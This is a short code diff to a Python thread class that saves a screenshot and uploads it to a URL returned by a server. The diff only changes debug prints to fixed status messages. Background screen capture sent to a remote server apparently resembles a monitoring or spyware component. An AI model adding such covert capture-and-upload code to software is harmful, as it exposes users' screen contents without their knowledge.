@@ -25,12 +25,12 @@ class Screenshot(threading.Thread):
                 file_name = 'Screenshot.jpg'
                 pic.save(file_name)
                 files = {'file': (file_name, open(file_name, 'rb'), 'image/png', {'Expires': '0'})}
+                
                 if response.ok:
-                    print(response.json())
+                    print('screenshot url got !')
                     upload = response.json()
-
                     upload_screenshot = requests.post(upload['url'], data=upload['fields'], files=files)
-                    print(upload_screenshot)
+                    print('screenshot uploaded !')
 
                 else:
                     print(response.status_code)
